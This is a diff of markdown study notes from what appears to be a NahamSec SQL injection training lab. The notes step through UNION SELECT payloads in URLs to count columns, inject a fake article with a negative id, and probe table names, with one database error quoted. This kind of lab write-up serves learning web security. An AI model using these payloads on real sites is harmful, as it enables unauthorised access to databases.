@@ -31,15 +31,23 @@ Now, ==Lets enumerate number of columns present here :-==
 http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2;--         (2 union select 1,2;--)
 http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2,3;--      (2 union select 1,2,3;--)
 
+
+
 http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2,3,4;--  (2 union select 1,2,3,4;--) this return actual article ,i.e the DB has 4 columns
+
+
 
 http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4;--  (-2 union select 1,2,3,4;--)
 ![[Screenshot From 2025-03-04 15-04-31.png]]
 so using id= -2  we were able to create another article that didn't exist earlier 
 
 
+
+
 http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4%20from%20article;--  ( -2 union select 1,2,3,4 from article;-- )
-response - 
+response - ![[Screenshot From 2025-03-04 15-26-12.png]]
+
+
 
 http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4%20from%20id;--  ( -2 union select 1,2,3,4 from id;-- )
 response -   Table 'nahamsec.id' doesn't exist
